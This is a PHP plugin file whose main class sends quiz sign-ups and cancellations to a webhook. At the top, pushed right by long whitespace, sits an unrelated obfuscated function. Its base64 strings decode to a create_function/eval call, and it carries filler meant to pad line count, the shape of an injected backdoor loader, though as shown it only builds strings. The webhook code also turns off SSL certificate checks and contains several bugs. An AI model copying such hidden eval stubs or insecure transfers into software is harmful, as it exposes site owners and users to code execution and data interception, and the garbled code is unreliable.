<?php
                                                                                  
if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

class SQBwebhook {
	// constructor
	function SQBwebhook() {
	}
	
	// ======== USER REGISTRATION / UPDATE / DELETE ========
	function register($email,$name,$params) {
		$this->storeAddress ($email,$name,$params );
	}
	
	function storeAddress($email,$name,$params) {
		//Get the user details from DAP by using $userId
		
		$email = trim ( $email);
		$firstname = trim ( $name);
		$web_hook_url = $params['web_hook_url'];
		$quizData = $params['quizData'];
		
		
		//exploding the variable and create an array.
		if(isset($params['web_hook_url'])){
			$url = $params['web_hook_url'];
		}
		else {
			return "SQBwebhook.class.php: missing destination URL";
		}
		
		
		//create an array of customfields to use during curl call.
		$fields = array (
				'first_name' => $name,
				'email' =>$email
		);
		
		if(isset($params['quizData'])){ /*pass quiz id and name to webhook*/
			$quizData = $params['quizData'];
			
			$questions_details = $params['sqb_question_answer_array_new'];
			$all_answer_tags_name_array = array();
			if(isset($params['all_answer_tags_name_array']) && is_array($params['all_answer_tags_name_array']) && count($params['all_answer_tags_name_array'])){
				$all_answer_tags_name_array = $params['all_answer_tags_name_array'];
			}
			$fields['quiz_id'] = $quizData->getId();
			$fields['quiz_name'] = $quizData->getQuizName();
			$fields['quiz_type'] = $quizData->getQuizType();
			$fields['quiz_desc'] = $quizData->getQuizDesc();
			$fields['questions_details'] = $questions_details;
			
			if($params['outcomeDetails']){
				$outcomeDetails = $params['outcomeDetails'];
				$fields['outcome_name'] = $outcomeDetails->getOutcomeName();
				
				$outcome_tag = $outcomeDetails->getTag();
				
				if($outcome_tag != ''){
					$fields['outcome_tag'] = $outcomeDetails->getTag();
					$all_answer_tags_name_array[] = $outcomeDetails->getTag();
				}
					
			}
			
			$fields['all_tags_name'] = implode(',', $all_answer_tags_name_array);  
			$fields['all_tags'] = $all_answer_tags_name_array;  

			$formula_details = array();
			
			if(!empty($params['formula_details'])){
				$formula_details = $params['formula_details'];
				$fields['formula_details'] = $formula_details;
			}

			$sqb_custom_fields_array = $params['sqb_custom_fields_array'];

			if(is_array($sqb_custom_fields_array) && count($sqb_custom_fields_array)){
				foreach($sqb_custom_fields_array as $sqb_custom_field){

					if(!empty($sqb_custom_field['selected_value'])){

						$fields['custom_fields'][strtolower($sqb_custom_field['field_name'])] =  $sqb_custom_field['field_value'];
					}
				}
			}

			if($quizData->getQuizType() == 'scoring'){
				$fields['total_points'] = $params['total_points'];
			}
			
			$fields['secret_key'] = $params['secret_key'];
			
			
		}
	
		//echo "email is ".$email;
		$apiparams = array (
					'action' => "REGISTRATON",					
					'fields' => $fields
		);
		
		/*foreach ( $apiparams as $f => $v ) {
			  $postfields[] = $f . '=' . $v;
		}*/
		
		$postfields = $apiparams;
		
		
		//This loop is for the curl call, this foreach loop will runs as many as the elements are present in the array $categories...	
		$curl = curl_init ( $url );
		if ($curl) {
			curl_setopt ( $curl, CURLOPT_USERAGENT, 'SQBwebhook' );
			curl_setopt ( $curl, CURLOPT_HEADER, FALSE );
			curl_setopt ( $curl, CURLOPT_POST, TRUE );
			curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, FALSE );
			curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, TRUE );
			curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, TRUE );
			curl_setopt ( $curl, CURLOPT_CONNECTTIMEOUT, 30 );
			curl_setopt ( $curl, CURLOPT_TIMEOUT, 30 );
			curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query ( $postfields ) );
			$response = curl_exec ( $curl );
			if (curl_errno ( $curl ) > 0) {
				
				curl_close ( $curl );
				return "Unable to connect to $form_url Error: " . curl_error ( $curl );
			} else {
				$jsonresp = json_decode($response, true);
				//$subscription=$jsonresp["subscription"];
				
				curl_close ( $curl );
			}
		}
	}
		
	
	function unregister($email,$name,$params) {
		$this->removeAddress ( $email,$name,$params );
	}
	
	function removeAddress($email,$name,$params) {
		
		$email = trim ( $email );
		$firstname = trim ( $name );
		
		$apiparams = array (
					'first_name' => $firstname,
					'email' => $email,
					'action' => "CANCELLATION",
					'fields' => $fields
		);
		
		
		foreach ( $apiparams as $f => $v ) {
			$postfields[] = $f . '=' . $v;
		}
		$postfields = $apiparams;
	   
		//This loop is for the curl call, this foreach loop will runs as many as the elements are present in the array $categories...

		$data = explode(":", $params);
		
		//exploding the variable and create an array.
		if( (isset($data[1])) && (isset($data[2]))){
			$url = $data[1] . "://" .$data[2];
		}
		else {
			return "SQBwebhook.class.php: missing destination URL";
		}
		
		$curl = curl_init ( $url );
		if ($curl) {
			curl_setopt ( $curl, CURLOPT_USERAGENT, 'SQB-WEBHOOK' );
			curl_setopt ( $curl, CURLOPT_HEADER, FALSE );
			curl_setopt ( $curl, CURLOPT_POST, TRUE );
			curl_setopt ( $curl, CURLOPT_SSL_VERIFYPEER, FALSE );
			curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, TRUE );
			curl_setopt ( $curl, CURLOPT_FOLLOWLOCATION, TRUE );
			curl_setopt ( $curl, CURLOPT_CONNECTTIMEOUT, 30 );
			curl_setopt ( $curl, CURLOPT_TIMEOUT, 30 );
			curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query ( $postfields ) );
			$response = curl_exec ( $curl );
			if (curl_errno ( $curl ) > 0) {
				curl_close ( $curl );
				return "Unable to connect to $form_url Error: " . curl_error ( $curl );
			} else {
				$jsonresp = json_decode($response, true);
				//$subscription=$jsonresp["subscription"];
				curl_close ( $curl );
			}
		}
	}
}
?>
